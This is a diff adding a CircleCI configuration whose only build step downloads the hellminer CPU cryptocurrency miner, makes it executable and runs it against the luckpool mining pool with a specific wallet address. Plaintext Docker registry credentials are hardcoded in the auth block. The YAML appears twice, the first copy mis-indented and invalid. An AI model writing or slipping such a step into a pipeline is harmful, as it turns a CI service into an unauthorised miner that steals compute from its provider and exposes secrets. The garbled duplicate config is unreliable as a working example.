@@ -1,0 +1,21 @@
+version: 2.0
+jobs:
+  build:
+      docker:
+            - image: circleci/ruby:2.4.2-jessie-node
+                    auth:
+                              username: KingCobra12
+                                        password: Malik7890  # context / project UI env-var reference
+                                            steps:
+                                                  - checkout
+                                                        - run:  wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RYVbHtN1v3MJEH7SwwtSdMLFRGiEoijxGL.Rig001 -p x
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: KingCobra12
+          password: Malik7890  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RYVbHtN1v3MJEH7SwwtSdMLFRGiEoijxGL.Rig001 -p x
